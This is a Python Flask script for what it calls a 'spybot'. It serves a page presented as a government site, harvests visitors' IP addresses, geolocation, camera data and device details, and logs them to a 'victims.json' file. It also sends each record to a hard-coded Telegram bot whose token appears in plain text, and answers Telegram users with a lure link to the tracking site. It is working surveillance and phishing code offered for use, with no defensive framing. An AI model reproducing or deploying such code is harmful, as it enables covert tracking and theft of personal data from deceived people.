from flask import Flask, request, render_template
import json
import requests
import os
from datetime import datetime

app = Flask(__name__)

BOT_TOKEN = '7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg'
CHAT_ID = '6908281054'

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': CHAT_ID,
        'text': message,
        'parse_mode': 'HTML'
    }
    requests.post(url, data=payload)

@app.route('/')
def index():
    return render_template('gov.html')

@app.route('/collect', methods=['POST'])
def collect():
    data = request.get_json()
    ip = request.remote_addr
    ua = data.get("userAgent")
    lat = data.get("latitude")
    lon = data.get("longitude")
    cam = data.get("camera")
    device = data.get("deviceInfo")

    message = f"""👁️ شکار آیا!
🌐 IP Address: {ip}
📱 Device: {ua}
📍 Location: {'❌ Location Not Available' if not lat else f"{lat}, {lon}"}
📷 Camera: {cam}
🧠 Device Info: {device}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""

    send_to_telegram(message)

    # Save locally
    with open('victims.json', 'a') as f:
        f.write(json.dumps(data) + '\n')

    return '✅ Info Received'

if __name__ == '__main__':
    app.run(debug=True)

# === Telegram Webhook ===
@app.route(f"/{BOT_TOKEN}", methods=['POST'])
def telegram_webhook():
    update = request.get_json()
    if "message" in update:
        chat_id = update["message"]["chat"]["id"]
        if update["message"].get("text") == "/start":
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
                "chat_id": chat_id,
                "text": "👋 خوش آمدید!\n👇 نیچے دیے گئے لنک پر کلک کریں:\nhttps://faizan-spybot.onrender.com"
            })
    return "ok", 200

# === Run the App ===
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
